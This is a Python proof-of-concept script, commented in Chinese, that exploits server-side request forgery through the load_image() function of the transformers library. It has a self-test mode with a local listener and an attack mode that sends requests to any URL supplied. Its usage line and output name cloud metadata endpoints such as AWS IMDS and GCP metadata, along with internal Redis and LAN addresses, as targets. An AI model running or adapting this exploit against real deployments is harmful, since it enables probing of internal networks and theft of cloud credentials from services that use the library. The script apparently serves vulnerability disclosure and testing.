#!/usr/bin/env python3
"""
SSRF PoC — huggingface/transformers load_image()

Usage:
    python3 transformers_ssrf_poc.py           # 默认测试 127.0.0.1:18888
    python3 transformers_ssrf_poc.py --url http://169.254.169.254/latest/meta-data/
"""

import argparse
import http.server
import sys
import threading
import time


def start_listener(port: int):
    """启动一个简单的 HTTP 服务器，用来接收 SSRF 请求"""
    received = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            received.append({"path": self.path, "headers": dict(self.headers)})
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"poc-ssrf-confirmed")

        def log_message(self, *a):
            pass

    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, received


def main():
    parser = argparse.ArgumentParser(description="Transformers SSRF PoC")
    parser.add_argument("--url", help="目标 URL（默认启动监听器并自测）")
    args = parser.parse_args()

    if args.url:
        # 攻击模式：直接访问目标 URL
        print(f"[*] 测试 SSRF 到: {args.url}")
        from transformers.image_utils import load_image
        try:
            load_image(args.url, timeout=5)
            print("[*] load_image 返回成功")
        except Exception as e:
            print(f"[*] load_image 抛异常（预期内，SSRF 已发生）: {type(e).__name__}")
        return

    # 自测模式：启动监听器 → 调用 load_image → 验证
    port = 18888
    print(f"[*] 启动监听器在 0.0.0.0:{port}")
    server, received = start_listener(port)
    time.sleep(0.3)

    test_url = f"http://127.0.0.1:{port}/poc-ssrf-test"
    print(f"[*] 调用 load_image('{test_url}')")
    print()

    from transformers.image_utils import load_image

    try:
        load_image(test_url, timeout=5)
    except Exception:
        pass

    server.shutdown()

    print(f"[*] 监听器收到 {len(received)} 个请求")
    if received:
        print(f"  PATH: {received[0]['path']}")
        print()
        print("  ✅ SSRF 确认！load_image 会向任意 URL 发起服务器端 HTTP GET 请求")
        print()
        print("  ── 可探测的目标 ──")
        print("  http://169.254.169.254/latest/meta-data/       (AWS IMDS)")
        print("  http://metadata.google.internal/               (GCP Metadata)")
        print("  http://10.0.0.1:6379                          (内网 Redis)")
        print("  http://192.168.1.1:80                          (内网服务)")
    else:
        print("  ❌ 未收到请求")
        sys.exit(1)


if __name__ == "__main__":
    main()
